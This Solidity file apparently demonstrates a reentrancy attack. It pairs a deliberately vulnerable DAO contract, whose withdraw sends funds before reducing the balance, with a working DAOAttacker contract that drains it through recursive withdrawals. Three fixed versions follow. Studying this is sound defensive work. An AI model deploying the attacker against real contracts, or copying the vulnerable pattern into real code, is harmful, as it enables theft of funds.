// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract SimpleDAOVulnerable {
    mapping(address => uint256) public balances;

    function donate() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        unchecked {
            balances[msg.sender] -= amount;
        }
    }

    function contractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract DAOAttacker {
    SimpleDAOVulnerable public target;
    uint256 public attackAmount;
    bool public attacking;

    constructor(address targetAddress) {
        target = SimpleDAOVulnerable(targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "need eth");
        attackAmount = msg.value;
        attacking = true;
        target.donate{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (attacking && address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function stopAttack() external {
        attacking = false;
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract SimpleDAOFixedCEI {
    mapping(address => uint256) public balances;

    function donate() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
    }
}

contract SimpleDAOFixedGuard {
    mapping(address => uint256) public balances;
    bool private entered;

    modifier nonReentrant() {
        require(!entered, "reentrant call");
        entered = true;
        _;
        entered = false;
    }

    function donate() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "insufficient");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        balances[msg.sender] -= amount;
    }
}

contract SimpleDAOPullOverPush {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public credits;

    function donate() external payable {
        balances[msg.sender] += msg.value;
    }

    function requestWithdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;
        credits[msg.sender] += amount;
    }

    function withdrawCredit() external {
        uint256 amount = credits[msg.sender];
        require(amount > 0, "no credit");
        credits[msg.sender] = 0;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
    }
}
